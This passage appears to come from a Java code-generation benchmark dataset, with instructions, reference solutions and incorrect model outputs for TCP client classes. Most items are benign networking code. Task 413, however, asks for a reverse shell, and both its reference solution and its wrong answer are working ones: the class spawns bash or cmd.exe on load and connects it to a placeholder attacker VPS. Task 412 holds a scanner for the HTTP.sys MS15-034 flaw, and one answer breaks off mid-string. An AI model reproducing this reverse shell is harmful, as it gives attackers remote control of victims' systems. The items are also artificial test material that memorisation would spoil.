    "Instruction": "Task Description: Implement a TCP client class in Java that establishes a connection to a server, handles bidirectional communication using object serialization, and manages various types of data frames for benchmarking purposes.\n\nClass Description: BinaryLinkClient is a TCP client implementation that connects to a benchmarking server, exchanging serialized data frames for coordinating benchmark execution, handling results, and managing output streams. It features thread-safe frame pushing, error handling, and resource management.\n\nAttributes:\n- lock: Object - Synchronization object for thread safety\n- clientSocket: Socket - TCP socket connection to the server\n- oos: ObjectOutputStream - Output stream for sending serialized objects\n- ois: ObjectInputStream - Input stream for receiving serialized objects\n- streamErr: ForwardingPrintStream - Error output stream that forwards to server\n- streamOut: ForwardingPrintStream - Standard output stream that forwards to server\n- outputFormat: OutputFormat - Proxy for formatting output frames\n- failed: boolean - Flag indicating connection failure state\n- resetToGo: int - Counter for periodic stream resets\n- delayedFrames: List<Serializable> - Buffer for frames during nested pushes\n- inFrame: boolean - Flag indicating ongoing frame transmission\n\nMethods:\n- BinaryLinkClient(String hostName, int hostPort) -> void - Constructor establishing connection to specified host:port\n- pushFrame(Serializable frame) -> void - Thread-safe method to send a serializable frame to server\n- readFrame() -> Object - Reads and returns the next frame from server\n- close() -> void - Closes all connections and streams\n- handshake() -> Options - Performs initial handshake with server, returns benchmark options\n- requestPlan() -> ActionPlan - Requests benchmark action plan from server\n- pushResults(IterationResult res) -> void - Sends benchmark results to server\n- pushException(BenchmarkException error) -> void - Sends benchmark exception to server\n- pushResultMetadata(BenchmarkResultMetaData res) -> void - Sends result metadata to server\n- getOutStream() -> PrintStream - Returns standard output stream\n- getErrStream() -> PrintStream - Returns error output stream\n- getOutputFormat() -> OutputFormat - Returns output format proxy\n\nInner Class:\n- ForwardingPrintStream - Custom PrintStream that forwards output to server as frames",
    "Canonical_solution": "import org.openjdk.jmh.runner.link.*;\nimport org.openjdk.jmh.runner.ActionPlan;\nimport org.openjdk.jmh.runner.BenchmarkException;\nimport org.openjdk.jmh.runner.format.OutputFormat;\nimport org.openjdk.jmh.runner.options.Options;\nimport org.openjdk.jmh.util.FileUtils;\nimport org.openjdk.jmh.util.Utils;\n\nimport java.io.*;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic final class BinaryLinkClient {\n\n    private static final int RESET_EACH = Integer.getInteger(\"jmh.link.resetEach\", 100);\n    private static final int BUFFER_SIZE = Integer.getInteger(\"jmh.link.bufferSize\", 64*1024);\n\n    private final Object lock;\n    private final Socket clientSocket;\n    private final ObjectOutputStream oos;\n    private final ObjectInputStream ois;\n    private final ForwardingPrintStream streamErr;\n    private final ForwardingPrintStream streamOut;\n    private final OutputFormat outputFormat;\n    private volatile boolean failed;\n    private int resetToGo;\n    private final List<Serializable> delayedFrames;\n    private boolean inFrame;\n\n    public BinaryLinkClient(String hostName, int hostPort) throws IOException {\n        this.lock = new Object();\n        this.clientSocket = new Socket(hostName, hostPort);\n        this.oos = new ObjectOutputStream(new BufferedOutputStream(clientSocket.getOutputStream(), BUFFER_SIZE));\n        this.oos.flush();\n        this.ois = new ObjectInputStream(new BufferedInputStream(clientSocket.getInputStream(), BUFFER_SIZE));\n        this.streamErr = new ForwardingPrintStream(OutputFrame.Type.ERR);\n        this.streamOut = new ForwardingPrintStream(OutputFrame.Type.OUT);\n        this.outputFormat = (OutputFormat) Proxy.newProxyInstance(\n                Thread.currentThread().getContextClassLoader(),\n                new Class[]{OutputFormat.class},\n                (proxy, method, args) -> {\n                    pushFrame(new OutputFormatFrame(ClassConventions.getMethodName(method), args));\n                    return null;\n                }\n        );\n        this.delayedFrames = new ArrayList<>();\n    }\n\n    private void pushFrame(Serializable frame) throws IOException {\n        if (failed) {\n            throw new IOException(\"Link had failed already\");\n        }\n\n        synchronized (lock) {\n            if (inFrame) {\n                delayedFrames.add(frame);\n                return;\n            }\n\n            try {\n                inFrame = true;\n\n                if (resetToGo-- < 0) {\n                    oos.reset();\n                    resetToGo = RESET_EACH;\n                }\n\n                oos.writeObject(frame);\n                oos.flush();\n\n                while (!delayedFrames.isEmpty()) {\n                    List<Serializable> frames = new ArrayList<>(delayedFrames);\n                    delayedFrames.clear();\n                    for (Serializable f : frames) {\n                        oos.writeObject(f);\n                    }\n                    oos.flush();\n                }\n            } catch (IOException e) {\n                failed = true;\n                throw e;\n            } finally {\n                inFrame = false;\n            }\n        }\n    }\n\n    private Object readFrame() throws IOException, ClassNotFoundException {\n        try {\n            return ois.readObject();\n        } catch (ClassNotFoundException | IOException ex) {\n            failed = true;\n            throw ex;\n        }\n    }\n\n    public void close() throws IOException {\n        FileUtils.safelyClose(streamErr);\n        FileUtils.safelyClose(streamOut);\n\n        synchronized (lock) {\n            oos.writeObject(new FinishingFrame());\n            FileUtils.safelyClose(ois);\n            FileUtils.safelyClose(oos);\n            clientSocket.close();\n        }\n    }\n\n    public Options handshake() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new HandshakeInitFrame(Utils.getPid()));\n            Object reply = readFrame();\n            if (reply instanceof HandshakeResponseFrame) {\n                return (((HandshakeResponseFrame) reply).getOpts());\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public ActionPlan requestPlan() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new InfraFrame(InfraFrame.Type.ACTION_PLAN_REQUEST));\n            Object reply = readFrame();\n            if (reply instanceof ActionPlanFrame) {\n                return ((ActionPlanFrame) reply).getActionPlan();\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public void pushResults(IterationResult res) throws IOException {\n        pushFrame(new ResultsFrame(res));\n    }\n\n    public void pushException(BenchmarkException error) throws IOException {\n        pushFrame(new ExceptionFrame(error));\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) throws IOException {\n        pushFrame(new ResultMetadataFrame(res));\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    class ForwardingPrintStream extends PrintStream {\n        public ForwardingPrintStream(final OutputFrame.Type type) {\n            super(new OutputStream() {\n                @Override\n                public void write(int b) throws IOException {\n                    pushFrame(new OutputFrame(type, new byte[]{(byte) (b & 0xFF)}));\n                }\n\n                @Override\n                public void write(byte[] b) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOf(b, b.length)));\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOfRange(b, off, len + off)));\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class BinaryLinkClient {\n    private final Object lock = new Object();\n    private Socket clientSocket;\n    private ObjectOutputStream oos;\n    private ObjectInputStream ois;\n    private ForwardingPrintStream streamErr;\n    private ForwardingPrintStream streamOut;\n    private OutputFormat outputFormat;\n    private boolean failed;\n    private int resetToGo;\n    private List<Serializable> delayedFrames;\n    private boolean inFrame;\n\n    public BinaryLinkClient(String hostName, int hostPort) {\n        try {\n            clientSocket = new Socket(hostName, hostPort);\n            oos = new ObjectOutputStream(clientSocket.getOutputStream());\n            ois = new ObjectInputStream(clientSocket.getInputStream());\n            streamErr = new ForwardingPrintStream(oos);\n            streamOut = new ForwardingPrintStream(oos);\n            delayedFrames = new ArrayList<>();\n            inFrame = false;\n            resetToGo = 0;\n            outputFormat = new OutputFormat();\n            failed = false;\n        } catch (IOException e) {\n            failed = true;\n        }\n    }\n\n    public void pushFrame(Serializable frame) {\n        synchronized (lock) {\n            if (inFrame) {\n                delayedFrames.add(frame);\n            } else {\n                sendFrame(frame);\n            }\n            inFrame = true;\n        }\n    }\n\n    private void sendFrame(Serializable frame) {\n        try {\n            oos.writeObject(frame);\n            oos.flush();\n        } catch (IOException e) {\n            failed = true;\n        }\n    }\n\n    public Object readFrame() {\n        try {\n            return ois.readObject();\n        } catch (IOException | ClassNotFoundException e) {\n            failed = true;\n            return null;\n        }\n    }\n\n    public void close() {\n        try {\n            if (oos != null) oos.close();\n            if (ois != null) ois.close();\n            if (clientSocket != null) clientSocket.close();\n        } catch (IOException e) {\n            failed = true;\n        }\n    }\n\n    public Options handshake() {\n        pushFrame(new HandshakeRequest());\n        try {\n            return (Options) readFrame();\n        } catch (Exception e) {\n            failed = true;\n            return null;\n        }\n    }\n\n    public ActionPlan requestPlan() {\n        pushFrame(new RequestPlan());\n        try {\n            return (ActionPlan) readFrame();\n        } catch (Exception e) {\n            failed = true;\n            return null;\n        }\n    }\n\n    public void pushResults(IterationResult res) {\n        pushFrame(res);\n    }\n\n    public void pushException(BenchmarkException error) {\n        pushFrame(error);\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) {\n        pushFrame(res);\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    private class ForwardingPrintStream extends PrintStream {\n        public ForwardingPrintStream(OutputStream out) {\n            super(out);\n        }\n\n        @Override\n        public void print(Object obj) {\n            try {\n                oos.writeObject(obj);\n                oos.flush();\n            } catch (IOException e) {\n                failed = true;\n            }\n        }\n\n        @Override\n        public void println(Object obj) {\n            print(obj);\n            try {\n                oos.flush();\n            } catch (IOException e) {\n                failed = true;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 412,
    "Instruction": "Task Description: Create a Java class that checks for a specific vulnerability (HTTP.sys Remote Code Execution) in a target server using TCP client communication.\n\nClass Description: The HttpSysRCEClient class is designed to detect the presence of the CVE-2015-1635 (MS15-034) vulnerability in a target HTTP server by sending specially crafted HTTP requests and analyzing the responses. It utilizes TCP socket communication to interact with the server.\n\nAttributes:\n- target: String - The URL of the target server to be checked\n- task: Task - An object containing task-related information and results\n\nMethods:\n- HttpSysRCEClient(String target, Task task) -> None - Constructor that initializes the target URL and task object\n- checkVulnerability() -> void - Main method that performs the vulnerability check by:\n  1. Establishing TCP connection to the target server\n  2. Sending crafted HTTP requests with malicious Range headers\n  3. Analyzing responses for vulnerability indicators\n  4. Adding vulnerability to task results if detected\n- addVulnerable() -> void - Helper method that adds vulnerability information to the task results when detected",
    "Canonical_solution": "import com.trackray.base.bean.Task;\nimport com.trackray.base.bean.Vulnerable;\nimport com.trackray.base.utils.IOUtils;\nimport com.trackray.base.utils.SysLog;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.URL;\nimport java.util.Arrays;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.FutureTask;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpSysRCEClient {\n\n    private String target;\n    private Task task;\n\n    public HttpSysRCEClient(String target, Task task) {\n        this.target = target;\n        this.task = task;\n    }\n\n    public void checkVulnerability() {\n        try {\n            URL url = new URL(target);\n            String host = url.getHost();\n            int port = url.getPort();\n\n            Socket socket = new Socket(host, port);\n\n            Callable<String> callable = new Callable<String>() {\n                @Override\n                public String call() throws Exception {\n                    String hexAllFfff = \"18446744073709551615\";\n                    String req = \"GET / HTTP/1.0\\r\\nHost: \" + host + \"\\r\\nRange: bytes=0-\" + hexAllFfff + \"\\r\\n\\r\\n\";\n\n                    InputStream inputStream = socket.getInputStream();\n                    OutputStream outputStream = socket.getOutputStream();\n\n                    outputStream.write(req.getBytes());\n                    outputStream.flush();\n\n                    return IOUtils.analysisStream(inputStream);\n                }\n            };\n\n            FutureTask<String> futureTask = new FutureTask<>(callable);\n            futureTask.run();\n            \n            try {\n                String result = futureTask.get(30, TimeUnit.SECONDS);\n                if (StringUtils.contains(result, \"Requested Range Not Satisfiable\")) {\n                    addVulnerable();\n                }\n            } catch (Exception e) {\n                Socket newSocket = new Socket(host, port);\n\n                callable = new Callable<String>() {\n                    @Override\n                    public String call() throws Exception {\n                        String hexAllFfff = \"18446744073709551615\";\n                        String req = \"GET / HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nRange: bytes=0-\" + hexAllFfff + \"\\r\\n\\r\\n\";\n\n                        InputStream inputStream = newSocket.getInputStream();\n                        OutputStream outputStream = newSocket.getOutputStream();\n\n                        outputStream.write(req.getBytes());\n                        outputStream.flush();\n\n                        return IOUtils.analysisStream(inputStream);\n                    }\n                };\n\n                futureTask.cancel(true);\n                futureTask = new FutureTask<>(callable);\n                futureTask.run();\n                \n                try {\n                    String result = futureTask.get(30, TimeUnit.SECONDS);\n                    if (StringUtils.contains(result, \"Requested Range Not Satisfiable\")) {\n                        addVulnerable();\n                    }\n                } catch (Exception ee) {\n                } finally {\n                    futureTask.cancel(true);\n                    newSocket.close();\n                }\n            } finally {\n                socket.close();\n            }\n        } catch (Exception e) {\n            SysLog.error(e);\n        }\n    }\n\n    private void addVulnerable() {\n        task.getResult().addVulnerable(\n            Vulnerable.builder()\n                .title(\"HTTP.sys \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\")\n                .address(target)\n                .level(Vulnerable.Level.HIGH.getLevel())\n                .type(Vulnerable.Type.CODE_EXECUTION.getType())\n                .vulnId(Arrays.asList(\"CVE-2015-1635\", \"MS15-034\"))\n                .build()\n        );\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.net.*;\nimport java.io.*;\n\npublic class HttpSysRCEClient {\n    private String target;\n    private Task task;\n\n    public HttpSysRCEClient(String target, Task task) {\n        this.target = target;\n        this.task = task;\n    }\n\n    public void checkVulnerability() {\n        try {\n            String[] parts = target.split(\":\");\n            if (parts.length < 2) {\n                System.err.println(\"Invalid URL format: \" + target);\n                return;\n            }\n            String host = parts[0];\n            int port = Integer.parseInt(parts[1]);\n            Socket socket = new Socket(host, port);\n            try {\n                OutputStream out = socket.getOutputStream();\n                PrintWriter writer = new PrintWriter(out);\n                writer.println(\"GET / HTTP/1.1\");\n                writer.flush();\n                byte[] rangeHeader = \"Range
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Create a Java class that establishes a reverse shell connection to a remote server using TCP protocol, with cross-platform compatibility for both Windows and Unix-like systems.\n\nClass Description: The JNDIObject class creates a reverse shell by spawning a local shell process (bash/sh on Unix, cmd.exe on Windows) and redirecting its input/output streams to a remote server via a TCP socket connection. The class includes platform detection logic to determine the appropriate shell to spawn.\n\nAttributes:\n- ip: String - The IP address of the remote server to connect to\n- port: String - The port number of the remote server to connect to\n- py_path: String - Path to Python interpreter (used for Unix-like systems)\n- cmd: String[] - The command array used to spawn the shell process\n\nMethods:\n- <static initializer>: () -> void - Automatically executes when the class is loaded, handles the entire reverse shell setup and connection process\n  - Detects operating system\n  - Finds appropriate shell or Python interpreter\n  - Spawns shell process\n  - Establishes socket connection\n  - Manages stream redirection between process and socket\n  - Handles cleanup on termination\n\nNote: The class uses a static initializer block rather than explicit methods to automatically execute its functionality when loaded. The implementation includes error handling and resource cleanup (closing sockets and destroying processes).",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class JNDIObject {\n    static {\n        try{\n            String ip = \"your-vps-ip\";\n            String port = \"443\";\n            String py_path = null;\n            String[] cmd;\n            if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"};\n                for(int i = 0; i < py_envs.length; ++i) {\n                    String py = py_envs[i];\n                    if ((new File(py)).exists()) {\n                        py_path = py;\n                        break;\n                    }\n                }\n                if (py_path != null) {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"};\n                    } else {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"};\n                    }\n                } else {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{\"/bin/bash\"};\n                    } else {\n                        cmd = new String[]{\"/bin/sh\"};\n                    }\n                }\n            } else {\n                cmd = new String[]{\"cmd.exe\"};\n            }\n            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();\n            Socket s = new Socket(ip, Integer.parseInt(port));\n            InputStream pi = p.getInputStream();\n            InputStream pe = p.getErrorStream();\n            InputStream si = s.getInputStream();\n            OutputStream po = p.getOutputStream();\n            OutputStream so = s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available() > 0) {\n                    so.write(pi.read());\n                }\n                while(pe.available() > 0) {\n                    so.write(pe.read());\n                }\n                while(si.available() > 0) {\n                    po.write(si.read());\n                }\n                so.flush();\n                po.flush();\n                Thread.sleep(50L);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {\n                }\n            }\n            p.destroy();\n            s.close();\n        }catch (Throwable e){\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class JNDIObject {\n    public static String ip;\n    public static String port;\n    public static String py_path;\n    public static String[] cmd;\n\n    static {\n        try {\n            String os = System.getProperty(\"os.name\").toLowerCase();\n            String shellCmd;\n\n            if (os.contains(\"win\")) {\n                shellCmd = \"cmd.exe\";\n            } else {\n                shellCmd = \"/bin/sh\";\n            }\n\n            ip = \"127.0.0.1\";\n            port = \"4444\";\n            py_path = \"/usr/bin/python\";\n            cmd = new String[] { shellCmd };\n\n            ProcessBuilder pb = new ProcessBuilder(cmd);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n\n            Socket socket = new Socket(ip, Integer.parseInt(port));\n            OutputStream socketOut = socket.getOutputStream();\n            InputStream socketIn = socket.getInputStream();\n\n            Thread stdinThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(socketIn))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        process.getOutputStream().write(line.getBytes());\n                        process.getOutputStream().flush();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n\n            Thread stdoutThread = new Thread(() -> {\n                try {\n                    byte[] buffer = new byte[1024];\n                    int bytesRead;\n                    while ((bytesRead = process.getInputStream().read(buffer)) != -1) {\n                        socketOut.write(buffer, 0, bytesRead);\n                        socketOut.flush();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n\n            stdinThread.start();\n            stdoutThread.start();\n\n            int exitCode = process.waitFor();\n            System.out.println(\"Process exited with code: \" + exitCode);\n\n            socket.close();\n            process.destroy();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Create a Java class that handles TCP socket communication for receiving screen data from an Android device via minicap and forwarding it to a data queue for processing.\n\nClass Description: MiniCapInputSocketThread is a thread class that establishes a TCP connection to a local port forwarded from an Android device, continuously reads screen data from the minicap service, and places the data into a blocking queue for further processing by other components. It also manages resource cleanup when the connection is terminated.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and status information\n- iDevice: IDevice - The Android device being monitored\n- dataQueue: BlockingQueue<byte[]> - Queue for storing received screen data\n- miniCapPro: MiniCapLocalThread - The parent minicap process thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - The main Android test task thread\n- session: Session - WebSocket session associated with the screen streaming\n\nMethods:\n- MiniCapInputSocketThread(IDevice, BlockingQueue<byte[]>, MiniCapLocalThread, Session) -> None - Constructor that initializes the thread with device, data queue, minicap process, and session references\n- run() -> None - Main thread execution that establishes the socket connection, reads data continuously, and handles cleanup when finished",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\nimport static org.cloud.sonic.agent.tools.BytesTool.subByteArray;\n\npublic class MiniCapInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n\n    public final static String ANDROID_INPUT_SOCKET_PRE = \"android-minicap-input-socket-task-%s-%s-%s\";\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(ANDROID_INPUT_SOCKET_PRE));\n    }\n\n    @Override\n    public void run() {\n        int finalMiniCapPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, finalMiniCapPort, \"minicap\");\n        Socket capSocket = null;\n        InputStream inputStream = null;\n        try {\n            capSocket = new Socket(\"localhost\", finalMiniCapPort);\n            inputStream = capSocket.getInputStream();\n            int len = 1024;\n            while (miniCapPro.isAlive()) {\n                byte[] buffer = new byte[len];\n                int realLen;\n                realLen = inputStream.read(buffer);\n                if (buffer.length != realLen && realLen >= 0) {\n                    buffer = subByteArray(buffer, 0, realLen);\n                }\n                if (realLen >= 0) {\n                    dataQueue.offer(buffer);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (miniCapPro.isAlive()) {\n                miniCapPro.interrupt();\n                log.info(\"miniCap thread closed.\");\n            }\n            if (capSocket != null && capSocket.isConnected()) {\n                try {\n                    capSocket.close();\n                    log.info(\"miniCap socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"miniCap input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, finalMiniCapPort, \"minicap\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class MiniCapInputSocketThread extends Thread {\n    private final Logger log;\n    private final IDevice iDevice;\n    private final BlockingQueue<byte[]> dataQueue;\n    private final MiniCapLocalThread miniCapPro;\n    private final AndroidTestTaskBootThread androidTestTaskBootThread;\n    private final Session session;\n\n    public MiniCapInputSocketThread(Logger log, IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, AndroidTestTaskBootThread androidTestTaskBootThread, Session session) {\n        this.log = log;\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.androidTestTaskBootThread = androidTestTaskBootThread;\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        Socket socket = null;\n        try {\n            socket = new Socket(\"localhost\", 23456);\n            InputStream inputStream = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                byte[] data = Arrays.copyOf(buffer, bytesRead);\n                dataQueue.put(data);\n            }\n        } catch (IOException e) {\n            log.error(\"Error reading from socket: \", e);\n        } finally {\n            if (socket != null) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    log.error(\"Error closing socket: \", e);\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 415,
    "Instruction": "Task Description: Create a TCP client class in Java that can send commands to a server and receive responses, with methods for starting, stopping, checking status, and flushing methods on the server.\n\nClass Description: TProfilerClient is a utility class that provides functionality to communicate with a profiling server via TCP. It handles socket creation, command sending, response reading, and connection cleanup.\n\nMethods:\n\nMethod1: start(String server, int port) -> void - Sends a START command to the specified server and port\nMethod2: stop(String server, int port) -> void - Sends a STOP command to the specified server and port\nMethod3: status(String server, int port) -> String - Sends a STATUS command and returns the server's response\nMethod4: flushMethod(String server, int port) -> void - Sends a FLUSHMETHOD command to the specified server and port\nMethod5: doSend(String command, String server, int port) -> void - Private helper method to send a command to the server\nMethod6: getStatus(String command, String server, int port) -> String - Private helper method to send a command and read the server's response\nMethod7: read(InputStream in) -> String - Private helper method to read data from an input stream until a carriage return is encountered",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TProfilerClient {\n\n    public static void start(String server, int port) {\n        doSend(Manager.START, server, port);\n    }\n\n    public static void stop(String server, int port) {\n        doSend(Manager.STOP, server, port);\n    }\n\n    public static String status(String server, int port) {\n        return getStatus(Manager.STATUS, server, port);\n    }\n\n    public static void flushMethod(String server, int port) {\n        doSend(Manager.FLUSHMETHOD, server, port);\n    }\n\n    private static void doSend(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private static String getStatus(String command, String server, int port) {\n        Socket socket = null;\n        try {\n            socket = new Socket(server, port);\n            OutputStream os = socket.getOutputStream();\n            BufferedOutputStream out = new BufferedOutputStream(os);\n            out.write(command.getBytes());\n            out.write('\\r');\n            out.flush();\n            return read(socket.getInputStream());\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (socket != null && !socket.isClosed()) {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        return null;\n    }\n\n    private static String read(InputStream in) throws IOException {\n        BufferedInputStream bin = new BufferedInputStream(in);\n        StringBuffer sb = new StringBuffer();\n        int i;\n        while ((i = bin.read()) != -1) {\n            char c = (char) i;\n            if (c == '\\r') {\n                break;\n            } else {\n                sb.append(c);\n            }\n        }\n        return sb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "public class TProfilerClient {\n    public void start(String server, int port) {\n        try {\n            doSend(\"START\", server, port);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop(String server, int port) {\n        try {\n            doSend(\"STOP\", server, port);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String status(String server, int port) {\n        try {\n            return getStatus(\"STATUS\", server, port);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void flushMethod(String server, int port) {\n        try {\n            doSend(\"FLUSHMETHOD\", server, port);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void doSend(String command, String server, int port) throws Exception {\n        try (Socket socket = new Socket(server, port)) {\n            OutputStream out = socket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out, true);\n            writer.println(command);\n        }\n    }\n\n    private String getStatus(String command, String server, int port) throws Exception {\n        try (Socket socket = new Socket(server, port)) {\n            OutputStream out = socket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out, true);\n            writer.println(command);\n            InputStream in = socket.getInputStream();\n            return read(in);\n        }\n    }\n\n    private String read(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            if (c == '\\r') {\n                break;\n            }\n            sb.append((char) c);\n        }\n        return sb.toString();\n    }\n}"
  },
  {
    "Task_id": 416,
    "Instruction": "Task Description: Create a Java class that implements file transfer functionality over TCP/IP protocol, including connection establishment, header and body parsing, and proper resource cleanup. The class should support progress monitoring through callbacks.\n\nClass Description: FileSender is a class that handles sending files to a remote server using TCP sockets. It implements Runnable for asynchronous operation and extends BaseTransfer for common transfer functionality. The class manages the entire file transfer process including connection setup, metadata transmission, file content streaming, and cleanup.\n\nAttributes:\n- mServerIpAddress: String - IP address of the server to connect to\n- mPort: int - Port number of the server\n- mFileInfo: FileInfo - Contains metadata about the file to be sent\n- mSocket: Socket - TCP socket for communication with server\n- mOutputStream: OutputStream - Buffered output stream for sending data\n- mOnSendListener: OnSendListener - Callback interface for transfer events\n\nMethods:\n- FileSender(Context, FileInfo, String, int) -> None - Constructor that initializes the file transfer parameters\n- setOnSendListener(OnSendListener) -> None - Sets the callback listener for transfer events\n- run() -> None - Main execution method called when the thread starts (implements Runnable)\n- init() -> None - Initializes the socket connection and output stream\n- parseHeader() -> None - Sends file metadata in a formatted header\n- parseBody() -> None - Streams the file content to the server\n- finish() -> None - Cleans up resources (closes streams and socket)\n- OnSendListener: Interface - Callback interface with methods for transfer events:\n  - onStart() -> None - Called when transfer begins\n  - onProgress(long, long) -> None - Called with progress updates\n  - onSuccess(FileInfo) -> None - Called on successful transfer\n  - onFailure(Throwable, FileInfo) -> None - Called if transfer fails",
